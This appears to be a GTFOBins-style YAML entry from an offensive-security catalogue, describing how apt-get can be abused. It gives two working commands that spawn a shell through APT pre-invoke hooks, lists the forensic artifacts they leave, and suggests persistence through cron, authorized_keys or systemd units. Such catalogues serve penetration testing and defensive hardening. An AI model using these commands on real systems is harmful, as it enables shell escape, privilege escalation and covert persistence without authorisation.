---
name: apt-get
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >/path/to/temp-file
    apt-get -y install -c /path/to/temp-file sl
  notes: For this to work the target package (i.e., `sl`) must not be already installed.
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
  notes: When the shell exits the `update` command is actually executed.
references:
- https://gtfobins.github.io/gtfobins/apt-get/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
